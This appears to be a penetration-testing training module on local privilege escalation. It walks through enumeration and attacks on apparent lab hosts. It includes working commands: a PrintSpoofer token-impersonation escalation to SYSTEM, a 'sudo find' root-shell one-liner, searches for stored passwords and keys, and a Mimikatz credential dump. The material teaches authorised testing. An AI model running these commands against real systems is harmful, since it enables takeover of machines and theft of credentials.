# 05 - Privilege Escalation

Turning a foothold on a machine into full control of that machine.

---

## The Goal

You have a login. It might be a low-privilege domain user, or a standard local account. This module gets you to SYSTEM on Windows or root on Linux.

**Local privilege escalation and domain privilege escalation are different things.** This module is local, getting more rights on one box. Module 06 is domain, getting more rights across the whole network. You often need the local one to enable the domain one.

---

## The Method

Same on every system. Enumerate, identify, exploit, verify.

```text
1. Enumerate everything about the current context
2. Compare it against known escalation paths
3. Pick the safest one
4. Exploit
5. Verify you actually have the higher privilege
```

**Automated tools do step 1 and 2 for you, but you must understand what they find.** A tool that says "unquoted service path" is useless if you cannot explain why that matters.

---

## Windows: Enumerate

Run WinPEAS. It checks hundreds of escalation paths in one pass.

```powershell
# From a foothold on a Windows host
.\winPEASx64.exe
```

Read the output for the things highlighted in red and yellow. The paths that actually come up in small environments:

| Path | What it is | Why it works |
| --- | --- | --- |
| **Unquoted service paths** | A service path with spaces and no quotes | Windows may run your binary instead |
| **Weak service permissions** | You can modify a service that runs as SYSTEM | Change what it runs |
| **AlwaysInstallElevated** | MSI files install as SYSTEM | Install your own |
| **Stored credentials** | Passwords in files, registry, or the credential store | Reuse them |
| **Scheduled tasks** | A task running as SYSTEM that you can modify | Change what it runs |
| **Token privileges** | SeImpersonate, SeAssignPrimaryToken | The "potato" family of exploits |

### The one that worked here: token impersonation

The `svc_sql` account runs a service, and service accounts almost always hold the `SeImpersonatePrivilege`. That single privilege leads to SYSTEM.

```powershell
# Confirm the privilege
whoami /priv
```

```text
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

```powershell
# Use a potato-family tool to abuse it
.\PrintSpoofer64.exe -i -c cmd
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Windows\system32> whoami
nt authority\system
```

**From service account to SYSTEM in one step.** Any account with `SeImpersonatePrivilege` can do this, and service accounts have it by default. That is why compromising a service account matters so much.

---

## Linux: Enumerate

On SRV-WEB01, LinPEAS is the equivalent.

```bash
./linpeas.sh
```

The paths that matter on Linux:

| Path | What it is |
| --- | --- |
| **SUID binaries** | Programs that run as their owner, often root |
| **sudo rules** | Commands you can run as root without a password |
| **Writable cron jobs** | Scheduled scripts you can edit |
| **Kernel version** | Old kernels have public exploits |
| **Credentials in files** | Config files, history, environment |

### Check sudo first, always

```bash
sudo -l
```

```text
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```

**`find` as root with no password is game over.** `find` can execute commands, so it becomes a root shell.

```bash
sudo find . -exec /bin/sh \; -quit
```

```bash
# whoami
root
```

The site GTFOBins documents exactly which common binaries can be abused this way and how. When `sudo -l` shows something, check it there.

---

## Stored Credentials

The most common real escalation is not an exploit at all. It is finding a password somebody left lying around.

### Windows

```powershell
# Search files for passwords
findstr /si password *.txt *.xml *.config *.ini

# The Windows credential store
cmdkey /list

# Unattended install files, which often contain the local admin password
Get-Content C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue

# Saved wireless and other credentials
```

### Linux

```bash
# History files
cat ~/.bash_history

# Config files with credentials
grep -riE "password|passwd|secret|api[_-]?key" /var/www 2>/dev/null

# Environment
env
```

**This is where most real escalations come from.** Exploits are exciting and rare. Reused and stored credentials are boring and everywhere.

---

## Verify

Never claim an escalation you have not confirmed.

```powershell
# Windows
whoami          # nt authority\system
whoami /groups  # confirm the SID S-1-5-18
```

```bash
# Linux
id              # uid=0(root)
```

**A shell that says it is SYSTEM but cannot read a SYSTEM-only file is not SYSTEM.** Prove it by doing something only the higher privilege can do, like reading the SAM database or a root-only file.

---

## What This Enables

Local SYSTEM on a host is not the goal. It is what lets you do the domain attacks in the next module.

With SYSTEM on a domain-joined machine you can:

- Read credentials from memory with Mimikatz
- Extract the machine account, which is itself a domain identity
- Use the machine's delegation rights, which is finding PT-04
- Dump cached credentials of anyone who has logged in

```powershell
# With SYSTEM, read what is in memory
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**This is the pivot point of the whole engagement.** Local SYSTEM on the right machine, one where a privileged user has logged in or which has delegation rights, is what turns a single-box compromise into a domain compromise.

---

## Checklist

- [ ] WinPEAS or LinPEAS run on each foothold
- [ ] `whoami /priv` and `sudo -l` checked first
- [ ] Escalation path identified and understood, not just run
- [ ] Escalation performed
- [ ] Higher privilege verified by doing something only it can do
- [ ] Stored credentials searched for
- [ ] Noted which host gives the best pivot into the domain

---

Next: [06-Active-Directory-Attacks.md](06-Active-Directory-Attacks.md)
